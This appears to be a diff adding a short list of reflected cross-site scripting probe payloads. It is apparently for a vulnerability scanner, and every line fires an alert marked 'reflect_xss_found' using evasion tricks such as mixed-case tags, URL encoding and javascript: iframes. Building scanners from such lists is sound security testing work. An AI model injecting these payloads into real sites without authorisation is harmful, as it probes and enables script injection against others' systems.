@@ -1,0 +1,6 @@
+<img src=1 onerror=alert('reflect_xss_found');>
+,><body onload=al%65%72t('reflect_xss_found')>
+,<ScRiPt>alert('reflect_xss_found');</ScRiPt>
+,"><iframe src=javascript:alert("reflect_xss_found")></iframe>
+,<////--><iframe src=javascript:alert("reflect_xss_found")></iframe>
+,';alert('reflect_xss_found');//"
